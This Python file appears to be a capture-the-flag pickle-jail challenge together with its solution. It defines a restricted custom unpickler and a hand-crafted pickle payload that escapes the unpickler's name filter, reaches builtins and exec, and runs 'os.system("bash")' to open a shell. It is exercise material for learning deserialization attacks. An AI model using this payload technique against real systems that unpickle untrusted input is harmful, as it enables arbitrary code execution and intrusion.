from pickle import (
    _Unpickler as EverSoSecureUnpickler,
    _Unframer,
    UnpicklingError,
    _Stop,
)
from base64 import b64decode as extract_base_64, b64encode


class NotAPickle(EverSoSecureUnpickler):
    from io import BytesIO

    def load(self):
        """Read a pickled object representation from the open file.

        Return the reconstituted object hierarchy specified in the file.
        """
        # Check whether Unpickler was initialized correctly. This is
        # only needed to mimic the behavior of _pickle.Unpickler.dump().
        if not hasattr(self, "_file_read"):
            raise UnpicklingError(
                "Unpickler.__init__() was not called by "
                "%s.__init__()" % (self.__class__.__name__,)
            )
        self._unframer = _Unframer(self._file_read, self._file_readline)
        self.read = self._unframer.read
        self.readinto = self._unframer.readinto
        self.readline = self._unframer.readline
        self.metastack = []
        self.stack = []
        self.append = self.stack.append
        self.proto = 0
        read = self.read
        dispatch = self.dispatch
        try:
            while True:
                key = read(1)
                if not key:
                    raise EOFError
                assert isinstance(key, (bytes, bytearray))
                dispatch[key[0]](self)
                print("STK", bytes([key[0]]), self.stack)
        except _Stop as stopinst:
            return stopinst.value

    def __init__(self, pickled):
        super().__init__(NotAPickle.BytesIO(pickled))
        self.step = 0

    def find_class(self, module, name):
        self.step += 1
        print("FIND", self.step, module, name)

        if module != "__main__" or "ex" in name.lower() or "ev" in name.lower():
            return "Don't even think about it"

        if self.step == 0:
            if name == "flag":
                return "Good boy", parts[2]
            else:
                return "You're bad at this >:("

        if self.step == 1:
            if name == "fleg":
                return ["Is it the flag? Is it not? Is it?", parts[1]]
            else:
                return "Wtf are you trying to hack me?"

        if self.step == 2:
            if name == "flog":
                return {"Can you get the flag out?": parts[0]}
            else:
                return "You should be used to it by now..."

        if self.step == 3:
            # TODO: think about snarky comment
            if name == "flig":
                return (
                    f"This one's gonna be a tad more difficult to extract: {parts[3]}"
                )

        if self.step >= 4:
            # Last but clearly least
            return parts[4]

        # Robustness requires default behavior even though it's impossible to get here
        return super().find_class(module, name)

    # We like light syntax so might as well make good use of it
    def __call__(self):
        return self.load()


def partition_flag():
    with open("flag.txt", "r") as file:
        flag = (
            file.read().strip()
        )  # Since we take security seriously, we partition the flag into 5 parts and only send them one at a time

    return [flag[i : i + 8] for i in range(0, len(flag), 8)]


def to_binbytes(b: bytes):
    return b"\x8e" + len(b).to_bytes(8, "little") + b


pkl_getattr = (
    b"\x80\x04c__main__\naaaa\n0c__main__\nbbbb\n0c__main__\n__builtins__.getattr\n."
)
pkl_builtins = b"\x80\x04c__main__\naaaa\n0c__main__\nbbbb\n0c__main__\n__builtins__\n."
pkl = (
    b"\x80\x04c__main__\nfleg\n0c__main__\nflog\n0c__main__\nNotAPickle\n222"
    + to_binbytes(pkl_getattr)
    + b"\x85R)R"
    + b"p0\n0"  # memo[0] = getattr, pop
    + to_binbytes(pkl_builtins)
    + b"\x85R)R"
    + b"p1\n0"  # memo[1] = builtins, pop
    + b"g0\n"
    + b"g1\n"
    + b"Vexec\n"
    + b"\x86R"
    + to_binbytes(b'import os;os.system("bash")')
    + b"\x85R"
    + b"."
)


print(b64encode(pkl))


# I've been told that was good practice
if __name__ == "__main__":
    parts = partition_flag()
    assert len(parts) == 5

    try:
        pickle = NotAPickle(pkl)()
        assert (
            type(pickle) == str
        ), "bad type"  # Lots of fickle fake pickles out there :c
    except Exception as err:
        print("ERR", err)
        pickle = None

    print("DEBUG", pickle)

    if "".join(parts) == pickle:
        print(
            "You pickled my pickle! Was it your own doing?\nHere's your reward:",
            "".join(parts),
        )
    else:
        print("Your pickles are fickle! >:~(")
